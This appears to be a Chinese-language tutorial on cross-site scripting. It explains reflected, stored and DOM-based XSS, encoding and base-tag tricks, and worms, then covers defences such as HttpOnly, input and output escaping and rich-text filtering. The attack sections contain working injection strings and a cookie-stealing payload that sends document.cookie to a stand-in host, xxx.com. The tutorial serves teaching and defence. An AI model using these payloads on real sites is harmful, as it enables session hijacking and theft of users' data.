# XSS 攻防之战

## 前言

跨站脚本攻击，英文是：Cross Site Script，缩写应该是 CSS，但是为了和 CSS(Cascading Style Sheet)层叠样式有所区别，所在安全领域叫做 “XSS”。

在上世纪 90 年代，这种攻击主要是跨域攻击，而一个网站就是一个域名，所以叫“跨站脚本攻击”。但是发展到今天，是否跨域已经不重要了，由于这个历史原因，XSS 这个名字也一直延续至今。

本文目录：

XSS 主要分类
XSS payload攻击
利用字符编码攻击
使用 Base 标签攻击
XSS 蠕虫攻击
HttpOnly 防御
用户输入检查防御
HTML 输出检查防御
在 CSS 中输出防御
富文本防御

## XSS 主要分类

1. 反射型 XSS

    顾名思义，反射型 XSS，只是将用户输入的数据“反射”给浏览器。  
    比如访问链接：https://wqs.jd.com/index.html?content=alert(1) 
    页面当中执行了，document.getElementById("content").innerHTML = content;然而这个content是参数传过来的，那么就触发了反射型 XSS。

2. 存储型 XSS

    顾名思义，存储型 XSS，就是已经被服务器存储了，比如用户在文本框中输入评论，然后提交保存到后台。然后其他用户浏览评论，导致触发存储型 XSS。  
    比如用户输入:  
    ```js
    <script>alert(1)</script>
    ```
    然后，前端显示innerHTML渲染到评论区，那么所有用户浏览到该评论，都会弹窗 "1"，所以存储型 XSS 一旦出现，影响是巨大的。

3. DOM 型 XSS

    DOm 型 XSS，从效果上来看，其实也属于反射型 XSS，但是由于 DOM 型 XSS 有其特殊性，所以单独拿出来讲。
    比如页面一个按钮，用户输入一个链接，然后点击 jump，就跳转到该链接。
    ```html
    <div id="jump"></div>
    <input type="button" id="msg" value="Comfire" onclick="myClick()">
    <img src="#" onerror=alert(/xss/)>
    ```
    ```js
    function myClick(){
        let value = document.getElementById("msg").value;
        document.getElementById("jump").innerHTMl="<a href='"+value+"'>click</a>";
    }
    ```
    我们可以输入：
    ```html
        '><img src=# onerror=alert(/xss/)/><' 
    ```  
    于是点击jump的时候，页面代码已经变成了：  
    ```html
    <a href=''><img src=# onerror=alert(/xss/)/>click</a>
    ```
    点击跳转，由于图片链接是空，就会触发 onerror ,就会弹窗 "/xss/" 了，这就是 DOM 型 XSS。  

## XSS payload

当 XSS 攻击成功之后，攻击将恶意脚本植入到页面当中，那么一旦页面被注入恶意脚本，攻击者就可以做各种事情，这种被称为“XSS Payload”。

比如上面 DOM 型 XSS 输入链接，如果改成输入：'><script src=http://xxx.com/xxx.js></script><';

在用户点击跳转的时候，就加载了 xxx.js 了，其中可以获取用户的 cookie，比如：
```js
let img = document.createElement('img')
img.src = "http://xxx.com/cookie?"+escape(document.cookie);
document.body.appendChild(img);
```
这段代码就偷偷的把用户端的 cookie 都上传到 xxx 服务器了。   

一旦 cookie 信息被窥探了，后果不敢相信。   

当然不仅仅是获取 cookie，已经加入的 js，可以执行任意操作，比如去调用接口，查询数据，然后将数据发到 xxx 服务器，或者直接调用接口，执行删除操作等等。

## 利用字符编码攻击

在 GB2312 系列编码的 HTML 中，%c0 可以吃掉 %5c (即：\)。
百度在一个 script 标签中输出了一个变量，于是提交输入的是 ";alert(/xss/) 来实现对百度的 xss 攻击，使用 ” 来闭合前面的 "。但是百度转义了双引号，如下：
```js
let redirectUrl = "\";alert(/xss/);";
```
这样子就没法 xss，变量内容仅仅是一个变量了。但是百度返回的是 GBK/GB2312 编码，那么 ”%c1\“ 组合在一起后，会变成一个 Unicode 字符，于是可以构造输入：%c0";alert(/xss/);
提交之后，百度转义响应之后就变成了：
```js
let redirectUrl = "%c0\";alert(/xss)";
```
由于是 gbk 编码，那么 %c1\ 被组合成一个 Unicode 字符，刚好把 ”\“ 吃掉，变成了如下：

```js
let redirectUrl = "繺";alert(/xss/);
```
于是被 XSS 了。

## 使用 Base 标签

在代码中，我们有时为了会使用相对路径，那么就会设置 <base\> 标签。
比如：
```html
<base href="https://img10.360buyimg.com">
<img src="/img/t1234342334.jpg">
```
这样，其实完整路径就是 base 拼接 src。这样的话，可能攻击者在页面任何位置设置了 base 标签，然后在设置的 base 路径下也同样设置图片，设置 js 文件，那么页面就被 XSS 了。
```js
<base href="http://xxx.com">
```

## XSS 蠕虫

XSS 蠕虫，核心是需要诱导用户去点击链接，攻击者在 Web 页面植入恶意 HTML 代码，然后发送给目标用户，用户点击之后，被感染，然后自动给感染用户的好友发送伪装的链接，已达到想蠕虫一样，快速蔓延的目的。

这种一旦感染，影响非常严重。 2007 年百度空间就曾出现过一次 XSS 蠕虫事件。

## XSS 防御

XSS 作为 web 前端头号敌人，XSS 防御还是比较复杂的。

### HttpOnly

HttpOnly 最早是微软提出的，并在 IE6中实现了，到如今已经成为一个标准。浏览器将禁止页面的 JavaScript 访问带有 HttpOly 属性的 Cookie。

HttpOnly 主要是为了解决 XSS 之后的 Cookie 劫持，当然，如果页面没有 XSS，也无需使用 HttpOnly了。比如上面提到的 XSS payload，就获取到了 Cookie 信息。

使用 HttpOnly 有助于缓解 XSS 攻击，防止被窃取敏感的 Cookie信息，本质上不是为了解决 XSS。

### 用户输入检查

输入检查，有点像“白名单”，只允许符合条件的数据被存入。比如用户名只能用字母、数字、_的组合。当前一般是服务器端和客户端都会实现相同的输入校验，如果仅仅是客户端校验，那就太容易被攻击者绕过了。

XSS 的输入检查，也被称为 “XSS filter”。

但是有时候，xss filter 在要求严格的地方也有些问题。
比如用户输入昵称是：天下“第一“  
经过 xss filter 之后，我们拿到的是：天下\"第一\"。
但是如果我们在HTML页面直接展示的时候，显示会是：天下\“第一\”。这个显然不是我们希望的。

### html 输出检查

一般来说，输入需要检查，输出的时候，除了富文本不太好检查外，在输出到 HTML 的时候，我们也需要采用编码或者转义等来防御 XSS 攻击。

一般来说，为了对抗 XSS，针对 HTML 的编码，我们会至少转义以下字符：
```html
& -->  &amp;
< -->  &lt;
> -->  &gt;
" --> &quot;
' --> &#x27;
/ --> &#x2f;
```
## 在 css 中输出

css 中的 style 标签和 style 属性都可以生成 XSS，比如：
```html
@import('htttp://xxx.com/xss.css');
<style>
body:{
    background:url(http://xxx.com/xss.css);
}
</style>
<div style="background:url(javascript:alert(/xss/))">
```

一般，我们禁止有用户可修改的变量在 style 标签内，还有 html 标签的 style 属性内。
如果需要有这个需求，就可以进行严格编码，只需要保留 字母、数字、下划线即可。

## 富文本

富文本本身就是包含标签和元素等数据的内容。在过滤富文本的时候，我们应该将可能被嵌入的“事件”都要干掉，比如元素上的 onclick，还有一些特殊标签，比如：<iframe\>,<script\>,<base\>,<form\>等，这些也应该被处理掉。

如果还需要更加严格的处理方式，那可能就需要使用 htmlParse，将节点全部转换成 AST，然后逐个过滤处理，彻底过滤掉可能的 XSS。


下面提供一个 XSS filter 以供参考：  
```js
function xss(str){
    return str?str.replace(/(?:^$|[\x00\x09-\x0D "'`=<>])/g,(m)=>{
        return m === '\t'   ? '&#9;'  
            :  m === '\n'   ? '&#10;' 
            :  m === '\x0B' ? '&#11;' 
            :  m === '\f'   ? '&#12;' 
            :  m === '\r'   ? '&#13;' 
            :  m === ' '    ? '&#32;' 
            :  m === '='    ? '&#61;' 
            :  m === '<'    ? '&lt;'
            :  m === '>'    ? '&gt;'
            :  m === '"'    ? '&quot;'
            :  m === "'"    ? '&#39;'
            :  m === '`'    ? '&#96;'
            : '\uFFFD';
    }):''
}
```
